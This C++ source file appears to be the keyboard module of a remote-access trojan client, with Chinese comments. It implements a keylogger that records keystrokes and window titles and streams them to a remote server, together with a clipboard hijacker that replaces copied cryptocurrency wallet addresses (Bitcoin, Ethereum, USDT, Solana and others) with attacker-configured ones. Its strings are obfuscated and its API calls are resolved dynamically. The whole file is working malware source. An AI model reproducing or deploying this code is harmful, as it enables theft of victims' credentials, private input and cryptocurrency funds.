// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#include "Common.h"
#include "KeyboardManager.h"
#include <tchar.h>

#if ENABLE_KEYBOARD

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#include <iostream>
#include <winbase.h>
#include <winuser.h>
#include "keylogger.h"
#include <iniFile.h>

#define CAPTION_SIZE 1024
#include "wallet.h"
#include "clip.h"
#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "clip_x64D.lib")
#else
#pragma comment(lib, "clip_x64.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "clipd.lib")
#else
#pragma comment(lib, "clip.lib")
#endif
#endif

CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user) : CManager(pClient)
{
    m_bIsOfflineRecord = offline;

    char path[MAX_PATH] = { "C:\\Windows\\" };
    GET_FILEPATH(path, skCrypt(KEYLOG_FILE));
    strcpy_s(m_strRecordFile, path);
    m_Buffer = new CircularBuffer(m_strRecordFile);

    m_bIsWorking = true;
    iniFile cfg(CLIENT_PATH);
    m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);

    m_hClipboard = __CreateThread(NULL, 0, Clipboard, (LPVOID)this, 0, NULL);
    m_hWorkThread = __CreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
    m_hSendThread = __CreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
    SetReady(TRUE);
}

CKeyboardManager1::~CKeyboardManager1()
{
    m_bIsWorking = false;
    WaitForSingleObject(m_hClipboard, INFINITE);
    WaitForSingleObject(m_hWorkThread, INFINITE);
    WaitForSingleObject(m_hSendThread, INFINITE);
    CloseHandle(m_hClipboard);
    CloseHandle(m_hWorkThread);
    CloseHandle(m_hSendThread);
    m_Buffer->WriteAvailableDataToFile(m_strRecordFile);
    delete m_Buffer;
}

void CKeyboardManager1::Notify()
{
    if (NULL == this)
        return;

    m_mu.Lock();
    iniFile cfg(CLIENT_PATH);
    m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
    m_mu.Unlock();
    sendStartKeyBoard();
    WaitForDialogOpen();
}

void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
{
    if (lpBuffer[0] == COMMAND_NEXT)
        NotifyDialogIsOpen();

    if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE) {
        m_bIsOfflineRecord = lpBuffer[1];
        iniFile cfg(CLIENT_PATH);
        cfg.SetStr("settings", "kbrecord", m_bIsOfflineRecord ? "Yes" : "No");
    }

    if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR) {
        m_Buffer->Clear();
        GET_PROCESS_EASY(DeleteFileA);
        DeleteFileA(m_strRecordFile);
    }
}

std::vector<std::string> CKeyboardManager1::GetWallet()
{
    m_mu.Lock();
    auto w = m_Wallet;
    m_mu.Unlock();
    return w;
}

int CKeyboardManager1::sendStartKeyBoard()
{
    BYTE	bToken[2];
    bToken[0] = TOKEN_KEYBOARD_START;
    bToken[1] = (BYTE)m_bIsOfflineRecord;
    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
    return m_ClientObject->Send2Server((char*)&bToken[0], sizeof(bToken), &mask);
}


int CKeyboardManager1::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
    int nRet = -1;
    DWORD	dwBytesLength = 1 + nSize;
    GET_PROCESS(DLLS[KERNEL], LocalAlloc);
    LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);

    lpBuffer[0] = TOKEN_KEYBOARD_DATA;
    memcpy(lpBuffer + 1, lpData, nSize);

    nRet = CManager::Send((LPBYTE)lpBuffer, dwBytesLength);
    GET_PROCESS(DLLS[KERNEL], LocalFree);
    LocalFree(lpBuffer);

    return nRet;
}

std::string GetKey(int Key) // 判断键盘按下什么键
{
    GET_PROCESS(DLLS[USER32], GetKeyState);
    std::string KeyString = "";
    //判断符号输入
    const int KeyPressMask=0x80000000; //键盘掩码常量
    int iShift=GetKeyState(0x10); //判断Shift键状态
    bool IS=(iShift & KeyPressMask)==KeyPressMask; //表示按下Shift键
    if(Key >=186 && Key <=222) {
        switch(Key) {
        case 186:
            if(IS)
                KeyString = skCrypt(":");
            else
                KeyString = skCrypt(";");
            break;
        case 187:
            if(IS)
                KeyString = skCrypt("+");
            else
                KeyString = skCrypt("=");
            break;
        case 188:
            if(IS)
                KeyString = skCrypt("<");
            else
                KeyString = skCrypt(",");
            break;
        case 189:
            if(IS)
                KeyString = skCrypt("_");
            else
                KeyString = skCrypt("-");
            break;
        case 190:
            if(IS)
                KeyString = skCrypt(">");
            else
                KeyString = skCrypt(".");
            break;
        case 191:
            if(IS)
                KeyString = skCrypt("?");
            else
                KeyString = skCrypt("/");
            break;
        case 192:
            if(IS)
                KeyString = skCrypt("~");
            else
                KeyString = skCrypt("`");
            break;
        case 219:
            if(IS)
                KeyString = skCrypt("{");
            else
                KeyString = skCrypt("[");
            break;
        case 220:
            if(IS)
                KeyString = skCrypt("|");
            else
                KeyString = skCrypt("\\");
            break;
        case 221:
            if(IS)
                KeyString = skCrypt("}");
            else
                KeyString = skCrypt("]");
            break;
        case 222:
            if(IS)
                KeyString = '"';
            else
                KeyString = skCrypt("'");
            break;
        }
    }
    //判断键盘的第一行
    if (Key == VK_ESCAPE) // 退出
        KeyString = skCrypt("[Esc]");
    else if (Key == VK_F1) // F1至F12
        KeyString = skCrypt("[F1]");
    else if (Key == VK_F2)
        KeyString = skCrypt("[F2]");
    else if (Key == VK_F3)
        KeyString = skCrypt("[F3]");
    else if (Key == VK_F4)
        KeyString = skCrypt("[F4]");
    else if (Key == VK_F5)
        KeyString = skCrypt("[F5]");
    else if (Key == VK_F6)
        KeyString = skCrypt("[F6]");
    else if (Key == VK_F7)
        KeyString = skCrypt("[F7]");
    else if (Key == VK_F8)
        KeyString = skCrypt("[F8]");
    else if (Key == VK_F9)
        KeyString = skCrypt("[F9]");
    else if (Key == VK_F10)
        KeyString = skCrypt("[F10]");
    else if (Key == VK_F11)
        KeyString = skCrypt("[F11]");
    else if (Key == VK_F12)
        KeyString = skCrypt("[F12]");
    else if (Key == VK_SNAPSHOT) // 打印屏幕
        KeyString = skCrypt("[PrScrn]");
    else if (Key == VK_SCROLL) // 滚动锁定
        KeyString = skCrypt("[Scroll Lock]");
    else if (Key == VK_PAUSE) // 暂停、中断
        KeyString = skCrypt("[Pause]");
    else if (Key == VK_CAPITAL) // 大写锁定
        KeyString = skCrypt("[Caps Lock]");

    //-------------------------------------//
    //控制键
    else if (Key == 8) //<- 回格键
        KeyString = skCrypt("[Backspace]");
    else if (Key == VK_RETURN) // 回车键、换行
        KeyString = skCrypt("[Enter]\n");
    else if (Key == VK_SPACE) // 空格
        KeyString = skCrypt(" ");
    //上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
    //上档键和别的键组合，输出时有字符输出
    /*
    else if (Key == VK_LSHIFT) // 左侧上档键
    KeyString = skCrypt("[Shift]");
    else if (Key == VK_LSHIFT) // 右侧上档键
    KeyString = skCrypt("[SHIFT]");
    */
    /*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
    else if (Key == VK_TAB) // 制表键
        KeyString = skCrypt("[Tab]");
    else if (Key == VK_LCONTROL) // 左控制键
        KeyString = skCrypt("[Ctrl]");
    else if (Key == VK_RCONTROL) // 右控制键
        KeyString = skCrypt("[CTRL]");
    else if (Key == VK_LMENU) // 左换档键
        KeyString = skCrypt("[Alt]");
    else if (Key == VK_LMENU) // 右换档键
        KeyString = skCrypt("[ALT]");
    else if (Key == VK_LWIN) // 右 WINDOWS 键
        KeyString = skCrypt("[Win]");
    else if (Key == VK_RWIN) // 右 WINDOWS 键
        KeyString = skCrypt("[WIN]");
    else if (Key == VK_APPS) // 键盘上 右键
        KeyString = skCrypt("右键");
    else if (Key == VK_INSERT) // 插入
        KeyString = skCrypt("[Insert]");
    else if (Key == VK_DELETE) // 删除
        KeyString = skCrypt("[Delete]");
    else if (Key == VK_HOME) // 起始
        KeyString = skCrypt("[Home]");
    else if (Key == VK_END) // 结束
        KeyString = skCrypt("[End]");
    else if (Key == VK_PRIOR) // 上一页
        KeyString = skCrypt("[PgUp]");
    else if (Key == VK_NEXT) // 下一页
        KeyString = skCrypt("[PgDown]");
    // 不常用的几个键:一般键盘没有
    else if (Key == VK_CANCEL) // Cancel
        KeyString = skCrypt("[Cancel]");
    else if (Key == VK_CLEAR) // Clear
        KeyString = skCrypt("[Clear]");
    else if (Key == VK_SELECT) //Select
        KeyString = skCrypt("[Select]");
    else if (Key == VK_PRINT) //Print
        KeyString = skCrypt("[Print]");
    else if (Key == VK_EXECUTE) //Execute
        KeyString = skCrypt("[Execute]");

    //----------------------------------------//
    else if (Key == VK_LEFT) //上、下、左、右键
        KeyString = skCrypt("[←]");
    else if (Key == VK_RIGHT)
        KeyString = skCrypt("[→]");
    else if (Key == VK_UP)
        KeyString = skCrypt("[↑]");
    else if (Key == VK_DOWN)
        KeyString = skCrypt("[↓]");
    else if (Key == VK_NUMLOCK)//小键盘数码锁定
        KeyString = skCrypt("[NumLock]");
    else if (Key == VK_ADD) // 加、减、乘、除
        KeyString = skCrypt("+");
    else if (Key == VK_SUBTRACT)
        KeyString = skCrypt("-");
    else if (Key == VK_MULTIPLY)
        KeyString = skCrypt("*");
    else if (Key == VK_DIVIDE)
        KeyString = skCrypt("/");
    else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
        KeyString = skCrypt(".");
    //小键盘数字键:0-9
    else if (Key == VK_NUMPAD0)
        KeyString = skCrypt("0");
    else if (Key == VK_NUMPAD1)
        KeyString = skCrypt("1");
    else if (Key == VK_NUMPAD2)
        KeyString = skCrypt("2");
    else if (Key == VK_NUMPAD3)
        KeyString = skCrypt("3");
    else if (Key == VK_NUMPAD4)
        KeyString = skCrypt("4");
    else if (Key == VK_NUMPAD5)
        KeyString = skCrypt("5");
    else if (Key == VK_NUMPAD6)
        KeyString = skCrypt("6");
    else if (Key == VK_NUMPAD7)
        KeyString = skCrypt("7");
    else if (Key == VK_NUMPAD8)
        KeyString = skCrypt("8");
    else if (Key == VK_NUMPAD9)
        KeyString = skCrypt("9");
    //-------------------------------------------//

    //-------------------------------------------//
    //*对字母的大小写进行判断*//
    else if (Key >=97 && Key <= 122) { // 字母:a-z
        if (GetKeyState(VK_CAPITAL)) { // 大写锁定
            if(IS) //Shift按下:为小写字母
                KeyString = Key;
            else // 只有大写锁定:输出大写字母
                KeyString = Key - 32;
        } else { // 大写没有锁定
            if(IS) // 按下Shift键: 大写字母
                KeyString = Key - 32;
            else // 没有按Shift键: 小写字母
                KeyString = Key;
        }
    } else if (Key >=48 && Key <= 57) { // 键盘数字:0-9及上方的符号
        if(IS) {
            switch(Key) {
            case 48: //0
                KeyString = skCrypt(")");
                break;
            case 49://1
                KeyString = skCrypt("!");
                break;
            case 50://2
                KeyString = skCrypt("@");
                break;
            case 51://3
                KeyString = skCrypt("#");
                break;
            case 52://4
                KeyString = skCrypt("$");
                break;
            case 53://5
                KeyString = skCrypt("%");
                break;
            case 54://6
                KeyString = skCrypt("^");
                break;
            case 55://7
                KeyString = skCrypt("&");
                break;
            case 56://8
                KeyString = skCrypt("*");
                break;
            case 57://9
                KeyString = skCrypt("(");
                break;
            }
        } else
            KeyString = Key;
    }
    if (Key != VK_LBUTTON || Key != VK_RBUTTON) {
        if (Key >=65 && Key <=90) { //ASCII 65-90 为A-Z
            if (GetKeyState(VK_CAPITAL)) { // 大写锁定:输出A-Z
                if(IS) // 大写锁定，并且按下上档键:输出为小写字母
                    KeyString = Key + 32;
                else //只有大写锁定:输出为大写字母
                    KeyString = Key;
            } else { // 大写没有锁定:a-z
                if(IS) {
                    KeyString = Key;
                } else {
                    Key = Key + 32;
                    KeyString = Key;
                }
            }
        }
    }

    return KeyString;
}

BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool hasData)
{
    GET_PROCESS(DLLS[USER32], GetForegroundWindow);
    HWND hFocus = (HWND)GetForegroundWindow();
    BOOL ReturnFlag = FALSE;
    if (hFocus != PreviousFocus) {
        if (lstrlen(WindowCaption) > 0) {
            if (hasData) {
                SYSTEMTIME   s;
                GetLocalTime(&s);
                sprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
                        WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
            }
            memset(WindowCaption, 0, CAPTION_SIZE);
            ReturnFlag=TRUE;
        }
        PreviousFocus = hFocus;
        GET_PROCESS_EASY(SendMessageA);
        SendMessage(hFocus, WM_GETTEXT, CAPTION_SIZE, (LPARAM)WindowCaption);
    }
    return ReturnFlag;
}

DWORD WINAPI CKeyboardManager1::SendData(LPVOID lparam)
{
    CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;

    int pos = 0;
    while(pThis->m_bIsWorking) {
        if (!pThis->IsConnected()) {
            pos = 0;
            Sleep(1000);
            continue;
        }
        int size = 0;
        char* lpBuffer = pThis->m_Buffer->Read(pos, size);
        if (size) {
            int nRet = pThis->sendKeyBoardData((LPBYTE)lpBuffer, size);
            delete[] lpBuffer;
        }
        Sleep(1000);
    }
    return 0;
}


int CALLBACK WriteBuffer(const char* record, void* user)
{
    CircularBuffer* m_Buffer = (CircularBuffer*)user;
    m_Buffer->Write(record, strlen(record));
    return 0;
}

DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam)
{
    CKeyboardManager1* pThis = (CKeyboardManager1*)lparam;
    while (pThis->m_bIsWorking) {
        auto w = pThis->GetWallet();
        if (!w.empty() && clip::has(clip::text_format())) {
            std::string value;
            clip::get_text(value);
            if (value.length() > 200) {
                Sleep(1000);
                continue;
            }
            auto type = detectWalletType(value);
            switch (type) {
            case WALLET_UNKNOWN:
                break;
            case WALLET_BTC_P2PKH:
            case WALLET_BTC_P2SH:
            case WALLET_BTC_BECH32:
                if (!w[ADDR_BTC].empty()) clip::set_text(w[ADDR_BTC]);
                break;
            case WALLET_ETH_ERC20:
                if (!w[ADDR_ERC20].empty()) clip::set_text(w[ADDR_ERC20]);
                break;
            case WALLET_USDT_OMNI:
                if (!w[ADDR_OMNI].empty()) clip::set_text(w[ADDR_OMNI]);
                break;
            case WALLET_USDT_TRC20:
                if (!w[ADDR_TRC20].empty()) clip::set_text(w[ADDR_TRC20]);
                break;
            case WALLET_TRON:
                if (!w[ADDR_TRON].empty()) clip::set_text(w[ADDR_TRON]);
                break;
            case WALLET_SOLANA:
                if (!w[ADDR_SOL].empty()) clip::set_text(w[ADDR_SOL]);
                break;
            case WALLET_XRP:
                if (!w[ADDR_XRP].empty()) clip::set_text(w[ADDR_XRP]);
                break;
            case WALLET_POLKADOT:
                if (!w[ADDR_DOT].empty()) clip::set_text(w[ADDR_DOT]);
                break;
            case WALLET_CARDANO_SHELLEY:
            case WALLET_CARDANO_BYRON:
                if (!w[ADDR_ADA].empty()) clip::set_text(w[ADDR_ADA]);
                break;
            case WALLET_DOGE:
                if (!w[ADDR_DOGE].empty()) clip::set_text(w[ADDR_DOGE]);
                break;
            }
        }
        Sleep(1000);
    }
    return 0x20251005;
}

DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
{
    CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
    MSG msg;
    TCHAR KeyBuffer[2048] = {};
    TCHAR szText[CAPTION_SIZE] = {};
    TCHAR WindowCaption[CAPTION_SIZE] = {};
    HWND PreviousFocus = NULL;
    GET_PROCESS(DLLS[USER32], GetAsyncKeyState);
    while(pThis->m_bIsWorking) {
        if (!pThis->IsConnected() && !pThis->m_bIsOfflineRecord) {
#if USING_KB_HOOK
            ReleaseHook();
#endif
            Sleep(1000);
            continue;
        }
        Sleep(5);
#if USING_KB_HOOK
        if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
            return -1;
        }
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
#else
        int num = lstrlen(KeyBuffer);
        if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
            bool newWindowInput = strlen(szText);
            if (newWindowInput) { // 在新的窗口有键盘输入
                lstrcat(KeyBuffer, szText);
                memset(szText, 0, sizeof(szText));
            }
            if (lstrlen(KeyBuffer) > 0) {
                if (!newWindowInput)
                    lstrcat(KeyBuffer, _T("\r\n"));
                const int offset = sizeof(_T("\r\n[内容:]")) - 1;
                memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
                memcpy(KeyBuffer, _T("\r\n[内容:]"), offset);
                pThis->m_Buffer->Write(KeyBuffer, strlen(KeyBuffer));
                memset(KeyBuffer,0,sizeof(KeyBuffer));
            }
        }
        for(int i = 8; i <= 255; i++) {
            if((GetAsyncKeyState(i)&1) == 1) {
                std::string TempString = GetKey (i);
                lstrcat(KeyBuffer,TempString.c_str());
            }
        }
#endif
    }
    return 0;
}

#endif
